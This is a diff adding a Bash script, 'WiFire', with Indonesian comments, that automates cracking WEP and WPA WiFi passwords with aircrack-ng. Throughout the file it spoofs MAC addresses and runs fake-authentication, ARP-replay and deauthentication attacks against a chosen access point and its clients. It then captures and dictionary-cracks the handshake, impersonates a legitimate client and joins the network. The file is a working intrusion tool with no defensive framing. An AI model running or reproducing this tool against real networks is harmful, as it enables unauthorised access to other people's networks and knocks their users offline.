@@ -1,0 +1,386 @@
+#!/bin/bash
+# (C)opyright blusp10it
+# Special thanks to vi013t and red-dragon
+# For my beloved qu33n ^^
+# WiFire v 0.1
+# Variabel dasar
+            mode="crack"                                 # AirCrack
+       interface="wlan0"                                 # Default
+           versi="0.1"                                   # Versi
+monitorInterface="mon0"                                  # Default
+           bssid=""                                      # null
+           essid=""                                      # null
+         channel=""                                      # null
+          client=""                                      # null
+        wordlist="/pentest/passwords/wordlists/wpa.txt"  # wordlist kamu
+         fakeMac="00:05:7c:9a:58:3f"                     # mac address palsu
+            plus="true"                                  # jika mendapatkan password, maka akan langsung dicoba
+            trap 'cleanup interrupt' 2                   # menangkap interrupt CTRL+C
+
+# Scanning
+cariAP() {
+iwlist wlan0 scan > /tmp/WiFire.tmp
+arrayESSID=( $(cat /tmp/WiFire.tmp | awk -F":" '/ESSID/{print $2}') )
+arrayBSSID=( $(cat /tmp/WiFire.tmp | grep "Address:" | awk '{print $5}\') )
+arrayChannel=( $(cat /tmp/WiFire.tmp | grep "Channel:" | tr ':' ' ' | awk '{print $2}\') )
+arrayProtected=( $(cat /tmp/WiFire.tmp | grep "key:" | sed 's/.*key://g') )
+arrayQuality=( $(cat /tmp/WiFire.tmp | grep "Quality" | sed 's/.*Quality=//g' | awk -F " " '{print $1}' ) )
+id=""
+index="0"
+for item in "${arrayBSSID[@]}"; do
+   if [ "$bssid" ] && [ "$bssid" == "$item" ] ; then id="$index" ;fi
+   command=$(cat /tmp/WiFire.tmp | sed -n "/$item/, +20p" | grep "WPA" )
+   if [ "$command" ] ; then arrayEncryption[$index]="WPA"
+      elif [ ${arrayProtected[$index]} == "off" ] ; then arrayEncryption[$index]="N/A"
+      else arrayEncryption[$index]="WEP" ; fi
+   index=$(($index+1))
+done
+# ESSID ber'spasi'
+cat /tmp/WiFire.tmp | awk -F":" '/ESSID/{print $2}' | sed 's/\"//' | sed 's/\(.*\)\"/\1/' > /tmp/WiFire.ssid
+index="0"
+while read line ; do
+   if [ "$essid" ] && [ "$essid" == "$line" ] ; then id="$index" ;  fi
+   arrayESSID[$index]="$line"
+   index=$(($index+1))
+done < "/tmp/WiFire.ssid"
+rm -f /tmp/WiFire.ssid
+}
+
+# Aksi dalam terminal X (=
+aksi() {
+   error="free"
+   if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Inisialisasi kode error
+   if [ "$error" == "free" ] ; then
+      xterm="xterm"  # default xterm; bisa diganti dengan terminal favorit kamu (=
+      command=$2
+      if [ "$3" == "2" ] ; then echo "Command: $command" ; fi
+      $xterm -geometry 100x15+0+0 -T "WiFire versi $versi - $1" -e "$command" # line+x+y
+      return 0
+   else
+      echo -e "ERROR *_*"
+      return 1
+   fi
+}
+
+# Mencari client
+cariClient () {
+   if [ -z "$1" ] ; then error="1" ; fi # inisialisasi kode error
+   if [ "$error" == "free" ] ; then
+      client=""
+      aksi "Menghapus temporary file" "rm -f /tmp/WiFire.dump* && sleep 1" "true"
+      aksi "Menjalankan airodump-ng" "airodump-ng --bssid $bssid --channel $channel --write /tmp/WiFire.dump --output-format netxml $monitorInterface" "true" &
+      sleep 3
+      # Kondisi enkripsi
+      if [ "$1" == "WEP" ] || [ "$1" == "N/A" ] ; then
+         sleep 3
+         client=$(cat "/tmp/WiFire.dump-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/' | head -1)
+      elif [ "$1" == "WPA" ] ; then
+         while [ -z "$client" ] ; do
+            sleep 2
+            client=$(cat "/tmp/WiFire.dump-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/' | head -1)
+         done
+      fi
+      # Kondisi ESSID
+      if [ -z "$essid" ] ; then
+         essid=$(cat "/tmp/WiFire.dump-01.kismet.netxml" | grep "<essid cloaked=\"false\">" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/')
+      fi
+      # Kondisi proses airodump-ng
+      command=$(ps aux | grep "airodump-ng" | awk '!/grep/ && !/awk/ && !/cap/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
+      if [ -n "$command" ] ; then
+         aksi "Mematikan program" "kill $command" "true" # jika ada proses airodump-ng, maka akan di-kill terlebih dulu
+         sleep 3
+      fi
+      aksi "Menghapus file temporer" "rm -f /tmp/WiFire.dump*" "true"
+      sleep 3
+      if [ "$client" == "" ] ; then client="N/A" ; fi # jika tidak ada klien maka dianggap tanpaklien
+      return 0
+   else
+      tampil error "Error *_*"
+      return 1
+   fi
+}
+
+function tampil() {
+   error="free"
+   if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Inisialisasi kode error
+   if [ "$1" != "aksi" ] && [ "$1" != "info" ] && [ "$1" != "error" ] ; then error="5"; fi
+   if [ "$error" == "free" ] ; then
+      keluaran=""
+      if [ "$1" == "aksi" ] ; then keluaran="\e[01;32m[*]\e[00m" ; fi
+      if [ "$1" == "info" ] ; then keluaran="\e[01;33m[i]\e[00m" ; fi
+      if [ "$1" == "error" ] ; then keluaran="\e[01;31m[-]\e[00m" ; fi
+      keluaran="$keluaran $2"
+      echo -e "$keluaran"
+      if [ "$3" == "true" ] ; then
+         if [ "$1" == "aksi" ] ; then keluaran="[*]" ; fi
+         if [ "$1" == "info" ] ; then keluaran="[i]" ; fi
+         if [ "$1" == "error" ] ; then keluaran="[-]" ; fi
+         echo -e "---------------------------------------------------------------------------------------------\n$keluaran $2"
+      fi
+      return 0
+   else
+      tampil error "tampil. Error kode: $error" 1>&2
+      echo -e "---------------------------------------------------------------------------------------------\n-->ERROR: tampil (Error kode: $error): $1 , $2 , $3 " ;
+      return 1
+   fi
+}
+
+# Cleanup
+function cleanup() {
+if [ "$1" == "nonuser" ] ; then exit 3 ; fi
+aksi "Menutup xterm" "killall xterm" "true"
+sleep 2
+if [ "$1" != "clean" ] ; then
+   echo # Blank
+fi
+tampil aksi "Mengembalikan keadaan awal"
+command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
+if [ "$command" == "$monitorInterface" ] ; then
+   sleep 3
+   aksi "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface" "true"
+fi
+if [ "$debug" != "true" ] ; then
+   command=""
+   tmp=$(ls /tmp/WiFire-*.cap 2> /dev/null)
+   if [ "$tmp" ] ; then command="$command /tmp/WiFire-*" ; fi
+   tmp=$(ls /tmp/WiFire.dump*.netxml 2> /dev/null)
+   if [ "$tmp" ] ; then command="$command /tmp/WiFire.dump*" ; fi
+   tmp=$(ls replay_arp*.cap 2> /dev/null)
+   if [ "$tmp" ] ; then command="$command replay_arp*.cap" ; fi
+   if [ -e "/tmp/WiFire.key" ] ; then command="$command /tmp/WiFire.key" ; fi
+   if [ -e "/tmp/WiFire.tmp" ] ; then command="$command /tmp/WiFire.tmp" ; fi
+   if [ -e "/tmp/WiFire.conf" ] ; then command="$command /tmp/WiFire.conf" ; fi
+   if [ -e "/tmp/WiFire.handshake" ] ; then command="$command /tmp/WiFire.handshake" ; fi
+   if [ ! -z "$command" ] ; then aksi "Menghapus file temporer" "rm -rfv $command" "true" ; fi
+fi
+echo -e "\e[01;34m[*]\e[00m Are you \e[01;36mblusp10it?\e[00m"
+exit 0
+}
+# PROGRAM BERJALAN
+#========================================================================================================================
+echo -e "\e[01;36m[*]\e[00m WiFire v$versi"
+tampil info "(C)opyright blusp10it"
+tampil info "Skrip ini berfungsi untuk melakukan cracking WiFi password (WPA/WEP)"
+#========================================================================================================================
+tampil aksi "Menganalisa keadaan"
+#========================================================================================================================
+# Are you ROOT?
+if [ "$(id -u)" != "0" ] ; then tampil error "Jalankan script ini sebagai root." 1>&2 ; cleanup nonuser; fi
+#========================================================================================================================
+# Menghapus file temporer
+tampil info "Menghapus file temporer"
+command=""
+tmp=$(ls /tmp/WiFire-*.cap 2> /dev/null)
+if [ "$tmp" ] ; then command="$command /tmp/WiFire-*" ; fi
+tmp=$(ls /tmp/WiFire.dump*.netxml 2> /dev/null)
+if [ "$tmp" ] ; then command="$command /tmp/WiFire.dump*" ; fi
+tmp=$(ls replay_arp*.cap 2> /dev/null)
+if [ "$tmp" ] ; then command="$command replay_arp*.cap" ; fi
+if [ -e "/tmp/WiFire.key" ] ; then command="$command /tmp/WiFire.key" ; fi
+if [ -e "/tmp/WiFire.tmp" ] ; then command="$command /tmp/WiFire.tmp" ; fi
+if [ -e "/tmp/WiFire.conf" ] ; then command="$command /tmp/WiFire.conf" ; fi
+if [ -e "/tmp/WiFire.handshake" ] ; then command="$command /tmp/WiFire.handshake" ; fi
+if [ ! -z "$command" ] ; then aksi "Menghapus file temporer" "rm -rfv $command" "true" ; fi
+#========================================================================================================================
+# Mencetak hasil scan
+tampil info "Mencari Access Point"
+aksi "Melakukan refresh pada interface" "ifconfig $interface down && ifconfig $interface up && sleep 3" "true"
+id=""             # variabel
+index="0"         # variabel
+loopMain="false"  # variabel
+while [ "$loopMain" != "true" ] ; do
+   cariAP
+   if [ "$id" ] ; then
+      loopMain="true"
+   else
+      if [ "$essid" ] ; then tampil error "Tidak dapat menemukan ESSID ($essid)" 1>&2 ; fi
+      if [ "$bssid" ] ; then tampil error "Tidak dapat menemukan ESSID ($bssid)" 1>&2 ; fi
+      loop=${#arrayBSSID[@]}
+      echo -e " Num |         ESSID          |       BSSID       | Protected | Cha | Quality\n-----|------------------------|-------------------|-----------|-----|---------"
+      for (( i=0;i<$loop;i++)); do
+         printf '  %-2s | %-22s | %-16s | %3s (%-3s) |  %-3s|  %-6s\n' "$(($i+1))" "${arrayESSID[${i}]}" "${arrayBSSID[${i}]}" "${arrayProtected[${i}]}" "${arrayEncryption[${i}]}" "${arrayChannel[${i}]}" "${arrayQuality[${i}]}"
+      done
+	   loopSub="false"
+	   while [ "$loopSub" != "true" ] ; do
+      read -p "[~] re[s]can, e[x]it atau pilih nomor tabel AP: "
+         if [ "$REPLY" == "x" ] ; then cleanup clean     # aksi keluar, maka metode cleanup dipanggil
+         elif [ "$REPLY" == "s" ] ; then loopSub="true"  # melakukan scan ulang
+         elif [ -z $(echo "$REPLY" | tr -dc '[:digit:]'l) ] ; then tampil error "Bad input, $REPLY" 1>&2
+         elif [ "$REPLY" -lt 1 ] || [ "$REPLY" -gt $loop ] ; then tampil error "Incorrect number, $REPLY" 1>&2
+         else id="$(($REPLY-1))" ; loopSub="true" ; loopMain="true"
+         fi
+      done
+   fi
+done
+# mengumpulkan variabel hasil pemilihan target AP
+essid="${arrayESSID[$id]}"
+bssid="${arrayBSSID[$id]}"
+channel="${arrayChannel[$id]}"
+encryption="${arrayEncryption[$id]}"
+# Memberikan info tentang persiapan penyerangan
+tampil info "Interface=$interface"
+tampil info "Interface monitor=$monitorInterface"
+tampil info "ESSID=$essid"
+tampil info "BSSID=$bssid"
+tampil info "Teknologi enkripsi=$encryption"
+tampil info "Channel=$channel"
+tampil info "Klien=$client"
+tampil info "Wordlist=$wordlist"
+tampil info "Mac address palsu=$fakeMac"
+#========================================================================================================================
+# Cek dependency
+#========================================================================================================================
+tampil info "Mengecek program yang dibutuhkan"
+# AirCrack-ng
+if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
+   tampil error "aircrack-ng tidak terinstall." 1>&2
+   read -p "[~] Apakah kamu mau meng-install-nya? [Y/n]: " -n 1
+   if [[ $REPLY =~ ^[Yy]$ ]] ; then aksi "Meng-install aircrack-ng" "apt-get -y install aircrack-ng" "true" ; fi
+   if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
+      tampil error "Gagal meng-install aircrack-ng" 1>&2 ; cleanup
+   else
+      tampil info "aircrack-ng ter-install"
+   fi
+fi
+# MacChanger
+if [ ! -e "/usr/bin/macchanger" ] ; then
+   tampil error "macchanger tidak terinstall."
+   read -p "[~] Apakah kamu mau meng-install-nya? [Y/n]: " -n 1
+   if [[ $REPLY =~ ^[Yy]$ ]] ; then aksi "Meng-install macchanger" "apt-get -y install macchanger" "true" ; fi
+   if [ ! -e "/usr/bin/macchanger" ] ; then
+      tampil error "Gagal meng-install macchanger" 1>&2 ; cleanup
+   else
+      tampil info "macchanger ter-install"
+   fi
+fi
+#========================================================================================================================
+tampil aksi "Melakukan penyesuaian"
+#========================================================================================================================
+# Cek apakah ada interface monitor lainnya
+tampil info "Mengecek keberadaan interface monitor yang aktif"
+command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
+if [ "$command" == "$monitorInterface" ] ; then
+   aksi "Monitor Mode (Dihentikan)" "airmon-ng stop $monitorInterface" "true"
+   sleep 2
+fi
+# Menjalankan monitor mode baru
+tampil aksi "Menjalankan monitor mode baru"
+aksi "Monitor Mode (Berjalan)" "airmon-ng start $interface | awk '/monitor mode enabled on/ {print \$5}' | tr -d '\011' | sed -e \"s/(monitor mode enabled on //\" | sed 's/\(.*\)./\1/' > /tmp/WiFire.tmp" "true"
+sleep 2
+command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
+if [ "$command" != "$monitorInterface" ] ; then
+   sleep 3
+   command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
+   if [ "$command" != "$monitorInterface" ] ; then
+      tampil error "Monitor interface $monitorInterface, tidak valid." 1>&2
+   cleanup
+   fi
+fi
+#========================================================================================================================
+# Konfigurasi mac address untuk fake authentication
+tampil aksi "Mengkonfigurasikan: MAC address"
+aksi "Mengganti mac address" "ifconfig $monitorInterface down && macchanger $monitorInterface -m $fakeMac && ifconfig $monitorInterface up" "true"
+sleep 3
+mac="$fakeMac"
+#========================================================================================================================
+# ATTACK
+if [ "$mode" == "crack" ] ; then
+   if [ -z "$client" ] ; then
+      tampil aksi "Mencari client"
+      cariClient $encryption
+   fi
+   tampil info "Klien=$client"
+   tampil aksi "Memulai: airodump-ng" 
+   aksi "Menghapus file temporer" "rm -f /tmp/WiFire* && sleep 1" "true"
+   aksi "airodump-ng" "airodump-ng --bssid $bssid --channel $channel --write /tmp/WiFire --output-format cap $monitorInterface" "true" "0|0|13" &
+   sleep 3
+#========================================================================================================================
+# ENKRIPSI WEP
+   if [ "$encryption" == "WEP" ] ; then
+      if [ "$client" == "N/A" ] ; then
+         tampil aksi "Attack (FakeAuth): $fakeMac" 
+         #aksi "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 0 -e \"$essid\" -a $bssid -h $mac $monitorInterface"   "true"
+         aksi "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 30 -o 1 -q 10 -e \"$essid\" -a $bssid -h $fakeMac $monitorInterface" "true"
+         #if [Association successful] = then
+         client=$mac
+         sleep 1
+      fi
+      tampil aksi "Attack (ARPReplay+Deauth): $client" 
+      aksi "aireplay-ng (arpreplay)" "aireplay-ng --arpreplay -e \"$essid\" -b $bssid -h $client $monitorInterface"   "true" "0|195|10" & 
+      sleep 2
+      aksi "aireplay-ng (deauth)" "aireplay-ng --deauth 5 -e \"$essid\" -a $bssid -c $fakeMac $monitorInterface" "true"
+      sleep 2
+      if [ "$client" == "$mac" ] ; then sleep 20 && aksi "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 0 -e \"$essid\" -a $bssid -h $fakeMac $monitorInterface" "true" ; fi
+      sleep 60
+#========================================================================================================================
+# ENKRIPSI WPA
+   elif [ "$encryption" == "WPA" ] ; then
+      tampil aksi "Capturing: Handshake" 
+      loop="0" # 0 = first, 1 = client, 2 = everyone
+      echo "blusp10it" > /tmp/WiFire.tmp
+      for (( ; ; )) ; do
+         aksi "aircrack-ng" "aircrack-ng /tmp/WiFire*.cap -w /tmp/WiFire.tmp -e \"$essid\" > /tmp/WiFire.handshake"   "true"
+         command=$(cat /tmp/WiFire.handshake | grep "Passphrase not in dictionary")
+         if [ "$command" ] ; then break; fi
+         sleep 3
+         if [ "$loop" != "1" ] ; then
+            if [ "$loop" != "0" ] ; then cariClient $encryption ; fi
+            sleep 2
+            if [ "" != "0" ] || [ "" == "true" ] || [ "$debug" == "true" ] ; then tampil aksi "Attack (Deauth): $client"  ; fi
+            aksi "aireplay-ng" "aireplay-ng --deauth 5 -a $bssid -c $client mon0" "true"
+            loop="1"
+         else
+            if [ "" != "0" ] || [ "" == "true" ] || [ "$debug" == "true" ] ; then tampil aksi "Attack (Deauth): *semua client*" ; fi
+            aksi "aireplay-ng" "aireplay-ng --deauth 5 -a $bssid mon0" "true"
+            loop="2"
+         fi
+         sleep 1
+      done
+      if [ "" != "0" ] || [ "" == "true" ] || [ "$debug" == "true" ] ; then tampil aksi "Captured: Handshake"  ; fi
+      aksi "Menutup semua proses" "killall xterm && sleep 3" "true"
+   fi
+#========================================================================================================================
+   if [ "$encryption" == "WEP" ] || [ "$encryption" == "WPA" ] ; then
+      tampil aksi "Memulai: aircrack-ng" 
+      if [ "$encryption" == "WEP" ] ; then aksi "aircrack-ng" "aircrack-ng /tmp/WiFire*.cap -e \"$essid\" -l /tmp/WiFire.key" "false" "0|350|30" ; fi
+      if [ "$encryption" == "WPA" ] ; then aksi "aircrack-ng" "aircrack-ng /tmp/WiFire*.cap -w $wordlist -e \"$essid\" -l /tmp/WiFire.key" "false" "0|0|20" ; fi
+   fi
+   aksi "Menutup semua proses" "killall xterm && sleep 3" "true"
+   aksi "airmon-ng" "airmon-ng stop $monitorInterface" "true"
+#========================================================================================================================
+   if [ -e "/tmp/WiFire.key" ] ; then
+      key=$(cat /tmp/WiFire.key)
+      tampil info "WiFi key: $key" 
+      if [ "$plus" == "true" ] ; then
+         if [ "$client" != "$mac" ] ; then
+            if [ "" != "0" ] || [ "" == "true" ] || [ "$debug" == "true" ] ; then tampil aksi "Attack (Spoofing): $client" ; fi
+         aksi "airmon-ng" "ifconfig $interface down && macchanger -m $client $interface && ifconfig $interface up"   "true"
+         fi
+         tampil aksi "Bergabung: $essid" 
+         if [ "$encryption" == "WEP" ] ; then
+            aksi "i[f/w]config" "ifconfig $interface down && iwconfig $interface essid $essid key $key && ifconfig $interface up"   "true"
+            elif [ "$encryption" == "WPA" ] ; then
+            aksi "wpa_passphrase" "wpa_passphrase $essid '$key' > /tmp/WiFire.conf" "true"
+            aksi "wpa_supplicant" "wpa_supplicant -B -i $interface -c /tmp/WiFire.conf -D wext" "true"
+            fi
+         sleep 5
+         aksi "dhclient" "dhclient $interface" "true"
+         if [ "" != "0" ] || [ "" == "true" ] || [ "$debug" == "true" ] ; then
+            ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
+            tampil info "IP: $ourIP" 
+            gateway=$(route -n | grep $interface | awk '/^0.0.0.0/ {getline; print $2}')
+            tampil info "Gateway: $gateway" 
+         fi
+      fi
+#========================================================================================================================
+   elif [ "$encryption" == "WPA" ] ; then
+      tampil error "WiFi Key tidak ada dalam wordlist" 1>&2
+      tampil aksi "Memindahkan handshake: $(pwd)/WiFire-$essid.cap" 1>&2
+      aksi "Memindahkan paket tangkapan" "mv -f /tmp/WiFire*.cap $(pwd)/WiFire-$essid.cap" "true"
+   elif [ "$encryption" != "N/A" ] ; then
+      tampil error "Terjadi kesalahan )=" 1>&2
+   fi
+fi
+
+# Membersihkan keadaan sebelum program dihentikan
+cleanup clean
